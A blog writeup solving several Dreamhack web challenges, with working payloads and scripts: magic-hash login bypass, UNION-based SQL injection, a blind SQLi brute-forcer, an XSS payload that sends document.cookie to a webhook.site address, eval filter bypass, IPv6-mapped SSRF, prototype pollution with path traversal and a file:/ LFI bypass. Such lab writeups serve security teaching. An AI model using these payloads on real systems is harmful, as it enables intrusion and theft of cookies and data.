---
title: Dreamhack (6)
published: 2025-01-06
category: Writeups
tags: [web, dh, dreamhack, ctf]
image: "./image/titles/dreamhack.png"
description: Some cool and fun web challenges from dreamhack.
draft: false
---

# Web Hacking

## [wargame.kr] jff3_magic

[Challenge](https://dreamhack.io/wargame/challenges/338)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/6ec0015d-c668-40db-9a3d-de8bca1e1a3c.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250604%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250604T101123Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=4293c492c100f33f404346d9606bfc1eada13d09fb4f0236c80981ab27cd8264)

we are suggested that `swp`, I searched and it is `swap file`, which is the editor of `vi/vim` on `linux`. I found an `index.php` file, I tried to download the file created when the developer created this file by :
`/.index.php.swp` and it loaded

![image](./image/dreamhack/119.png)

I used `strings` and extracted the following important content:

```php
$result = @mysqli_fetch_array($q);
$q = mysqli_query($connect, "select * from member where no=".$_GET['no']);
    exit("No Hack - ".$test);
if ($test != 0){
$test = custom_firewall($_GET['no']);
```

and 

```php
if (isset($_POST['id'])) {
    sleep(2); // DO NOT BRUTEFORCE
    $id = mysqli_real_escape_string($connect, $_POST['id']);
    $q = mysqli_query($connect, "SELECT * FROM `member` where id='{$id}'");
    $userinfo = @mysqli_fetch_array($q);	
    if (hash('haval128,5', $_POST['pw'], false) == mysqli_real_escape_string($connect, $userinfo['pw'])) {
        echo 'Success! Hello '.$id."<br />";
        if ($id == "admin")
            echo 'Flag : '.$FLAG;
    } else {
        echo 'Incorrect Password';
    }
}
```

so we can extract `information` through variable no and it is filtered by `custom_firewall()` function but I can't find that `information`. so. And the second part is the query check for `login`. We can understand that login with id `admin` will return `FLAG`, but the biggest barrier is the `password`. here we can see:

```php
hash('haval128,5', $_POST['pw'], false) == mysqli_real_escape_string($connect, $userinfo['pw'])
```

The pw information entered will be hashed haval128,5 and loosely compared == with the pw hash in the database. Here based on the challenge name I searched for hash haval128,5 magic and found strings that can bypass false comparison in php but with the condition that the admin password when hashed must have the format 0e...., this will be loosely compared, for example:

```php
<?php

echo '0e123456'=='0e789';

# result true
?>
```

Now let's try one of the useful payloads `KrRepI8+` and now, login with `id=admin`, `pw=KrRepI8+`

![image](./image/dreamhack/120.png)


Also after some thinking I wrote a `script` to bruteforce to find the password to try

```python
import requests

url = "http://host3.dreamhack.games:17925/index.php"
pw_temp = ""
charset_range = list(range(48, 58)) + list(range(97, 103)) 

for pos in range(32):
    for i in charset_range:
        payload = f"-1||pw like concat('{pw_temp}',char({i}),char(37))"
        r = requests.get(url, params={"no": payload})

        if "admin" in r.text:
            pw_temp += chr(i)
            print(f"[+] Found char {pos+1}: {chr(i)} → {pw_temp}")
            break
    else:
        print("[!] none...", pos+1)
        break

print("hash pw:", pw_temp)
# hash pw: 0e531247968804642688052356464312
```

so it is still `0e` from the beginning, and to find the correct password will probably take a lot of time

**NOTE**
magic hashes (github)[https://github.com/spaze/hashes/tree/master]

---

## [wargame.kr] dmbs335

[Challenge](https://dreamhack.io/wargame/challenges/344)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/a5a024bb-6b7c-41a2-8662-4978ed62a584.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250604%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250604T231800Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=a55975f9786f7e16adbb1dc6642a59870e37602486937b5d505a54ff252fcb37)

`source`

```php
<?php 

if (isset($_GET['view-source'])) {
        show_source(__FILE__);
        exit();
}

include("./inc.php"); // Database Connected

function getOperator(&$operator) { 
    switch($operator) { 
        case 'and': 
        case '&&': 
            $operator = 'and'; 
            break; 
        case 'or': 
        case '||': 
            $operator = 'or'; 
            break; 
        default: 
            $operator = 'or'; 
            break; 
}} 

if(preg_match('/session/isUD',$_SERVER['QUERY_STRING'])) {
    exit('not allowed');
}

parse_str($_SERVER['QUERY_STRING']); 
getOperator($operator); 
$keyword = addslashes($keyword);
$where_clause = ''; 

if(!isset($search_cols)) { 
    $search_cols = 'subject|content'; 
} 

$cols = explode('|',$search_cols); 

foreach($cols as $col) { 
    $col = preg_match('/^(subject|content|writer)$/isDU',$col) ? $col : ''; 
    if($col) { 
        $query_parts = $col . " like '%" . $keyword . "%'"; 
    } 

    if($query_parts) { 
        $where_clause .= $query_parts; 
        $where_clause .= ' '; 
        $where_clause .= $operator; 
        $where_clause .= ' '; 
        $query_parts = ''; 
    } 
} 

if(!$where_clause) { 
    $where_clause = "content like '%{$keyword}%'"; 
} 
if(preg_match('/\s'.$operator.'\s$/isDU',$where_clause)) { 
    $len = strlen($where_clause) - (strlen($operator) + 2);
    $where_clause = substr($where_clause, 0, $len); 
} 


?>
<style>
    td:first-child, td:last-child {text-align:center;}
    td {padding:3px; border:1px solid #ddd;}
    thead td {font-weight:bold; text-align:center;}
    tbody tr {cursor:pointer;}
</style>
<br />
<table border=1>
    <thead>
        <tr><td>Num</td><td>subject</td><td>content</td><td>writer</td></tr>
    </thead>
    <tbody>
        <?php
            $result = mysql_query("select * from board where {$where_clause} order by idx desc");
            while ($row = mysql_fetch_assoc($result)) {
                echo "<tr>";
                echo "<td>{$row['idx']}</td>";
                echo "<td>{$row['subject']}</td>";
                echo "<td>{$row['content']}</td>";
                echo "<td>{$row['writer']}</td>";
                echo "</tr>";
            }
        ?>
    </tbody>
    <tfoot>
        <tr><td colspan=4>
            <form method="">
                <select name="search_cols">
                    <option value="subject" selected>subject</option>
                    <option value="content">content</option>
                    <option value="content|content">subject, content</option>
                    <option value="writer">writer</option>
                </select>
                <input type="text" name="keyword" />
                <input type="radio" name="operator" value="or" checked /> or &nbsp;&nbsp;
                <input type="radio" name="operator" value="and" /> and
                <input type="submit" value="SEARCH" />
            </form>
        </td></tr>
    </tfoot>
</table>
<br />
<a href="./?view-source">view-source</a><br />
```

Reading through the `source` code, the application used to perform the query `only` has 2 `operators`: `or` and, `and` prints the results. We can see that the input information such as `search_cols`, `keyword`, `operator` has been cleaned up to prevent `injection` into `queries`. But pay attention to `parse_str($_SERVER['QUERY_STRING'])`; and the code below, if `search_cols` is `selected`, then the information will be saved into `cols` and `execute` the safe query immediately, this is really difficult to inject into the `sql` template. But if we pass in the `search_cols` parameter a `fake` value that is not in the available `words`, everything will not follow that `logic` anymore. Instead, combined with `parse_str($_SERVER['QUERY_STRING'])` we can create unexpected `variables` like `query_parts` that have not been `declared` before, it will turn all parameters in the URL into real PHP `variables`. Here we reuse it to make `query_parts` the injection site.

`payload: ?search_cols=&query_parts=1%20union%20select%201,2,3,4#`

![image](./image/dreamhack/121.png)

`payload : ?search_cols=&query_parts=1%20union%20select%201,2,3,%20table_name%20from%20information_schema.tables#`

![image](./image/dreamhack/122.png)

`payload : ?search_cols=&query_parts=1%20union%20select%201,2,3,%20column_name%20from%20information_schema.columns%20where%20table_name=%27Th1s_1s_Flag_tbl%27#`

![image](./image/dreamhack/123.png)

`payload : ?search_cols=&query_parts=1%20union%20select%201,2,3,%20f1ag%20from%20Th1s_1s_Flag_tbl#`

![image](./image/dreamhack/124.png)

---

## [wargame.kr] crack crack crack it

[Challenge](https://dreamhack.io/wargame/challenges/330)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/393f0e27-629c-48ea-83aa-57f3e6919859.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250605%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250605T002221Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=f4a1e366f988088e1c1bef52157dedcdb31edfe71859d4a9c751b136aae0def0)

In this challenge we have to `bruteforce` the `password` to `authenticate`, according to which we know the first string is `G4HeulB` and the following part is `hex-like values`. I have referred to the articles to be able to find the `password` in the simplest way

![image](./image/dreamhack/125.png)

```python
import itertools, string
character_set = string.ascii_lowercase + string.digits
min_len, max_len = 2, 10
for l in range(min_len, max_len):
    for m in itertools.product(character_set, repeat=l):
        print('G4HeulB' + ''.join(m))
```

![image](./image/dreamhack/126.png)

`password : G4HeulBzfb0`

![image](./image/dreamhack/127.png)

---

## Relative Path Overwrite

[Challenge](https://dreamhack.io/wargame/challenges/439)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/4910215e-1731-4c03-ae6c-538022ce6ecc.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250605%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250605T005328Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=8f235d791bf3873a10a6c6848d2a754e906be4f33aa1940a23e87f189dfb32ec)

First, what is RPO?

`RPO (Relative Path Overwrite)` is a technique that exploits the browser's handling of relative paths that do not match the actual path (when the `<base>` declaration is missing or incorrect), to:

force the browser to load the `HTML` page itself as a `CSS` file

or cause the browser to reprocess files incorrectly

`RPO` is often exploited in conjunction with `XSS` in `CSS`, or when there is a partially manipulated `<style>` or `innerHTML`.

```html
<script src="filter.js"></script>
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var url = new URL(window.location.href);
    var param = url.searchParams.get("param");

    if (typeof filter !== 'undefined') {
        for (var i = 0; i < filter.length; i++) {
            if (param.toLowerCase().includes(filter[i])) {
                param = "nope !!";
                break;
            }
        }
    }

    param_elem.innerHTML = param;
</script>
```

`RPO exploit` idea in this section:
* The param value is injected directly into `innerHTML` → if the `HTML` tag is injected (without being blocked by the filter), it can cause `XSS`.
* But the filter blocks strings like: `["script", "on", "frame", "object"]`
* No `<base>` tag → `RPO` exploit possibility appears

**What does RPO do here?**

The browser thinks that `filter.js` is in the `/param` path if the `URL` is:
`http://target.site/index.php/param`

-> `script src="filter.js"` will become `http://target.site/index.php/filter.js`

But the server actually still returns `index.php`, not `filter.js`

If the `param=` control contains the closing `<script>` tag:
`script><svg/onload=alert(1)>`
Then the entire `<script>` is closed prematurely and `XSS` occurs.

`payload: /index.php/?page=vuln&param=<img src="123" onerror="location.href='https://webhook.site/35edd727-4824-44c6-b8b6-fbcda33ac3cb/?a'%2bdocument.cookie">`

![image](./image/dreamhack/128.png)

---

## Addition calculator

[Challenge](https://dreamhack.io/wargame/challenges/1021)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/cd0fc31b-74b4-40b5-87f1-28dba5071e88.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250608%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250608T005115Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=ff760733b4735dd4e89f491dcfb3f3620b7a30688711b549380496a0674f24b5)

`app.py`

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
import string
import subprocess
import re


app = Flask(__name__)


def filter(formula):
    w_list = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    w_list.extend([" ", ".", "(", ")", "+"])

    if re.search("(system)|(curl)|(flag)|(subprocess)|(popen)", formula, re.I):
        return True
    for c in formula:
        if c not in w_list:
            return True


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    else:
        formula = request.form.get("formula", "")
        if formula != "":
            if filter(formula):
                return render_template("index.html", result="Filtered")
            else:
                try:
                    formula = eval(formula)
                    return render_template("index.html", result=formula)
                except subprocess.CalledProcessError:
                    return render_template("index.html", result="Error")
                except:
                    return render_template("index.html", result="Error")
        else:
            return render_template("index.html", result="Enter the value")


app.run(host="0.0.0.0", port=8000)
```

In this challenge, we can immediately see the `code execution vulnerability` at line `33` via the `eval()` function. But before that, the content in the `formula` will be `filtered` by the `filter()` function before being sent. Let's briefly go through the `filter()` function:

**Only allowed:**
* `a-z, A-Z, 0-9`
* `Space`
* `Dot .`
* `Parenthesis ( )`
* `Plus sign +`

Blocked characters: `' " _ / -` and all other special characters.

Here I immediately thought of concatenating the characters together and using the `open().read()` function to read the file.

`payload`

```shell
open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
```

The above `payload` is equivalent to:
* `chr(102) = 'f'`
* `chr(108) = 'l'`
* `chr(97) = 'a'`
* `chr(103) = 'g'`
* `chr(46) = '.'`
* `chr(116) = 't'`
* `chr(120) = 'x'`
* `chr(116) = 't'`

![image](./image/dreamhack/129.png)

---

## Where-is-localhost

[Challenge](https://dreamhack.io/wargame/challenges/1560)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/5e5e5970-0b9a-4102-9c0a-b13786ce7429.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250607%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250607T135456Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=0a3efe6471b1a405c50b0aeeabe1381e684cddbb157e1a49d82c5de9c1496688)

`main.py`

```python
from flask import Flask, render_template, request
import ipaddress
import urllib.parse
import urllib.request
import urllib.error

app = Flask(__name__)

try:
    with open('flag') as f:
        flag = f.read()
except FileNotFoundError:
    flag = 'flag{this_is_a_fake_flag}'

@app.route('/')
def form():
    return render_template('index.html')

@app.route('/vuln', methods=['POST'])
def vuln():
    name = request.form.get('vulntest')
    try:
        address = ipaddress.ip_address(name)
        if address.version == 4:
            return "no..."
        url = urllib.parse.urlparse(f"http://[{address.exploded}]:5000/localonly")
        if url.netloc != f'[{address.exploded}]:5000':
            print(url.netloc, f'[{address.exploded}]')
            return "no..."
        req = urllib.request.Request(url.geturl())
        return urllib.request.urlopen(req).read().decode('utf-8')
    except ValueError:
        return "no..."
    except urllib.error.URLError:
        return "connection refused"

@app.route('/localonly', methods=['GET'])
def localonly():
    addr = ipaddress.ip_address(request.remote_addr)
    if addr.is_loopback and addr.version == 4:
        return flag
    else:
        return 'not loopback'

if __name__ == '__main__':
    app.run('0.0.0.0', 5000)
```

**Flow of operation:**

* Route `/vuln`: Get input from form, validate as `IPv6`, then request to `http://[IPv6]:5000/localonly`
* Route `/localonly`: Only return flag if request comes from `IPv4` loopback `(127.0.0.1)`

**Bypass conditions:**

* Input must be a valid `IPv6` address
* Must be `IPv6` (not `IPv4`)
* The netloc `URL` must exactly match `[IPv6]:5000`
* The final request must come from `IPv4` loopback to get `flag`

**Solution:**
Use `IPv4-mapped` `IPv6` address to bypass.

`payload`

```shell
::ffff:127.0.0.1
```
* Step 1: `::ffff:127.0.0.1` is `IPv6` → Pass through `check version == 4`
* Step 2: `URL` becomes `http://[...ffff:7f00:0001]:5000/localonly`
* Step 3: `Python network stack` recognizes `ffff:7f00:0001 = 127.0.0.1`
* Step 4: The actual request goes to `127.0.0.1:5000/localonly`
* Step 5: `Flask` sees `remote_addr` = `127.0.0.1` (`IPv4` loopback) → Returns `flag`!

![image](./image/dreamhack/130.png)

---

## amocafe

[Challenge](https://dreamhack.io/wargame/challenges/899)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/999f3c66-4626-497a-b25c-b4e99eaedcb6.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250607%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250607T145900Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=0edeb5d8b0e4059e2dc98caa8631742e107cd8386c1fa893b56add652d0a0f60)

`app.py`

```python
#!/usr/bin/env python3
from flask import Flask, request, render_template

app = Flask(__name__)

try:
    FLAG = open("./flag.txt", "r").read()       # flag is here!
except:
    FLAG = "[**FLAG**]"

@app.route('/', methods=['GET', 'POST'])
def index():
    menu_str = ''
    org = FLAG[10:29]
    org = int(org)  
    st = ['' for i in range(16)]

    for i in range (0, 16):
        res = (org >> (4 * i)) & 0xf
        if 0 < res < 12:   
            if ~res & 0xf == 0x4: 
                st[16-i-1] = '_'
            else:
                st[16-i-1] = str(res)
        else:
            st[16-i-1] = format(res, 'x')
    menu_str = menu_str.join(st)

    # POST
    if request.method == "POST":
        input_str =  request.form.get("menu_input", "")
        if input_str == str(org):
            return render_template('index.html', menu=menu_str, flag=FLAG)
        return render_template('index.html', menu=menu_str, flag='try again...')
    # GET
    return render_template('index.html', menu=menu_str)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

We are given a `source code` and a `web`, open the web we will see that we are given a string which is `Amo's favorite menu`. Let's look at the source code. We can see that:

* org is the segment `FLAG[10-29]` and then converted to `int` type.
* a list st is created with `16` `empty` elements.
* create a loop `16` times:
    - shift org right `(4*i)` bit and take the last `4 bits` out and save to `res`.
        + if `res` is in the `1-11` segment then continue to compare if `~res & 0xf == 0x4` then save as `'_'`, otherwise save as `string`
        + if `res` is outside that segment then save as hex
Finally all are saved to `menu_str`

At this point I thought I needed to reverse the string `1_c_3_c_0__ff_3e` that the web gave me back to its `integer` and enter it. I wrote a script to do it again.

`script`

```python
def reverse_menu(s):
    org =0
    st = list(s)
    
    for i in range(16):
        c = st[16-i-1]

        if c == '_':
            res = 11
        elif c.isdigit():
            res = int(c)
        else:
            res = int(c,16)

        org |= (res << (4*i))
    return org

print(reverse_menu("1_c_3_c_0__ff_3e"))
```

`result : 2002760202557848382`

![image](./image/dreamhack/131.png)

---

## filestorage

[Challenge](https://dreamhack.io/wargame/challenges/643)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/bef15679-2693-4c16-adb5-1a8e281c8db2.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250608%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250608T035838Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=c1e193bea26bbb67810b5ae89ac6d94c77622043b3c92647e358b0543b99a4de)

`app.js`

```javascript
const express=require('express');
const bodyParser=require('body-parser');
const ejs=require('ejs');
const hash=require('crypto-js/sha256');
const fs = require('fs');
const app=express();


var file={};
var read={};
function isObject(obj) {
  return obj !== null && typeof obj === 'object';
}
function setValue(obj, key, value) {
  const keylist = key.split('.');
  const e = keylist.shift();
  if (keylist.length > 0) {
    if (!isObject(obj[e])) obj[e] = {};
    setValue(obj[e], keylist.join('.'), value);
  } else {
    obj[key] = value;
    return obj;
  }
}

app.use(bodyParser.urlencoded({ extended: false }));
app.set('view engine','ejs');


app.get('/',function(req,resp){
	read['filename']='fake';
	resp.render(__dirname+"/ejs/index.ejs");

})

app.post('/mkfile',function(req,resp){
	let {filename,content}=req.body;
	filename=hash(filename).toString();
	fs.writeFile(__dirname+"/storage/"+filename,content,function(err){
		if(err==null){
			file[filename]=filename;
			resp.send('your file name is '+filename);
		}else{
			resp.write("<script>alert('error')</script>");
			resp.write("<script>window.location='/'</script>");
		}
	})

})

app.get('/readfile',function(req,resp){
	let filename=file[req.query.filename];
	if(filename==null){
		fs.readFile(__dirname+'/storage/'+read['filename'],'UTF-8',function(err,data){
			resp.send(data);
		})
	}else{
		read[filename]=filename.replaceAll('.','');
		fs.readFile(__dirname+'/storage/'+read[filename],'UTF-8',function(err,data){
			if(err==null){
				resp.send(data);
			}else{
				resp.send('file is not existed');
			}
		})
	}

})

app.get('/test',function(req,resp){
	let {func,filename,rename}=req.query;
	if(func==null){
		resp.send("this page hasn't been made yet");
	}else if(func=='rename'){
		setValue(file,filename,rename)
		resp.send('rename');
	}else if(func=='reset'){
		read={};
		resp.send("file reset");
	}
})


app.listen(8000);
```

This challenge is also quite new to me. Accordingly, first, understand the "`prototype`" in `JavaScript`:
In `JavaScript`, every `object` inherits from a "`common template`" called `Object.prototype.`
For example:

```javascript
let obj = {};
obj.toString(); // works, because toString comes from Object.prototype
```
You can add `properties` to `Object.prototype`, and all `objects` can see it:

```javascript
Object.prototype.secret = "flag123";
console.log({}.secret); // Prints out: "flag123"
```

This is extremely dangerous because it can be controlled by the user.
So back to the application.
Suppose the read variable at first is:

```javascript
let read = {}; // empty object
And you call the function setValue(file, '__proto__.filename', '../../flag')
```

This function will make:
`Object.prototype.filename = '../../flag';`
→ That is, any object without a `filename` will still see `.filename = '../../flag'`
And the consequence is at:
In the route `/readfile`, there is a section:

```javascript
let filename = file[req.query.filename];
if (filename == null) {
fs.readFile(__dirname + '/storage/' + read['filename'], ...);
}
```

if we don't create `read['filename']` explicitly from the beginning, it will call `fake` like at `'/'`
Therefore, according to this logic, we take advantage of `rename` to add `filename = '../../flag'` to `Object.prototype.`
then need to call reset to reset `read['filename']` to `{}`. then we don't need to pass in `filename` to make it empty, then it will go to the first if block to read at `__dirname+'/storage/'+read['filename']`, but after reset `read['filename']` is `empty` but it still calls in `Object.prototype.` out means there is a `flag`.

`http://host3.dreamhack.games:17768/test?func=rename&filename=__proto__.filename&rename=../../../flag`

![image](./image/dreamhack/132.png)

`http://host3.dreamhack.games:17768/test?func=reset`

![image](./image/dreamhack/133.png)

`http://host3.dreamhack.games:17768/readfile?filename=`

![image](./image/dreamhack/134.png)

---

## Dream Gallery

[Challenge](https://dreamhack.io/wargame/challenges/552)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/dd5dc820-877a-4e6e-9c2a-c1325d22d432.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250608%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250608T005705Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=572ba562310e1b5d476caad3f47916210e47033a110448584f5930ac7931b86a)

`app.py`

```python
from flask import Flask, request, render_template, url_for, redirect
from urllib.request import urlopen
import base64, os

app = Flask(__name__)
app.secret_key = os.urandom(32)

mini_database = []


@app.route('/')
def index():
    return redirect(url_for('view'))


@app.route('/request')
def url_request():
    url = request.args.get('url', '').lower()
    title = request.args.get('title', '')
    if url == '' or url.startswith("file://") or "flag" in url or title == '':
        return render_template('request.html')

    try:
        data = urlopen(url).read()
        mini_database.append({title: base64.b64encode(data).decode('utf-8')})
        return redirect(url_for('view'))
    except:
        return render_template("request.html")


@app.route('/view')
def view():
    return render_template('view.html', img_list=mini_database)


@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        f = request.files['file']
        title = request.form.get('title', '')
        if not f or title == '':
            return render_template('upload.html')

        en_data = base64.b64encode(f.read()).decode('utf-8')
        mini_database.append({title: en_data})
        return redirect(url_for('view'))
    else:
        return render_template('upload.html')


if __name__ == "__main__":
    img_list = [
        {'초록색 선글라스': "static/assetA#03.jpg"}, 
        {'분홍색 선글라스': "static/assetB#03.jpg"},
        {'보라색 선글라스': "static/assetC#03.jpg"}, 
        {'파란색 선글라스': "static/assetD#03.jpg"}
    ]
    for img in img_list:
        for k, v in img.items():
            data = open(v, 'rb').read()
            mini_database.append({k: base64.b64encode(data).decode('utf-8')})
    
    app.run(host="0.0.0.0", port=80, debug=False)
```

this is the feature of `lfi` challenge, we need to provide url for local to read and finally will `base64` encode and hide it in source.
In this challenge we need to bypass 2 things which are `file://` and `flag`
+ `file://` we can change with `file:/`
+ `flag` can encode `url`

`payload: GET /request?url=file%3A%2F%2566%256c%2561%2567.txt&title=<anything>`

![image](./image/dreamhack/135.png)

![image](./image/dreamhack/136.png)

---

## development-env 

[Challenge](https://dreamhack.io/wargame/challenges/783)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/5e2d38c5-27f8-4cd7-b634-704601d68774.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250608%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250608T051454Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=40e0c333802adf433e7ef1fe6daa9616d7aff395587f8bf252350734c8f92e4b)

because in this challenge the mode `isDevelopmentEnv` is enabled so I think it can be `exploited` based on the `exception` blocks

browsing the source code we can see the `key` cannot be `bruteforced` in a short time so I think we need to use some error to return the `secret key`.

I tried all the errors from `login` missing `parameter`, no `parameter` to `cookie` error and finally I was able to find the `secret key` via `User-Agent` from the source code.

![image](./image/dreamhack/137.png)

`"jwt = await cryptolib.generateJWT(req.body[\"id\"], \"kitvP5j71fwycLz\");\r"`

`secretKey = kitvP5j71fwycLz`

![image](./image/dreamhack/138.png)

![image](./image/dreamhack/139.png)

---











